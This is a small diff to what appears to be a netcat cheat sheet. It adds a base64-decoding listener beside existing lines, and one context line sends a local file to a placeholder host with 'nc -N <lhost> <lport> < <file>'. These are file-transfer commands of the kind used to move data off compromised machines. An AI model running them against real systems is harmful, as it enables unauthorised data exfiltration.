@@ -19,3 +19,6 @@ nc -N <lhost> <lport> < <file>
 # receive file
 nc -vlp <lport> > <file>
 
+# receive file base64 encoded
+sudo nc -lnp <lport> | base64 -i -d > <file>
+
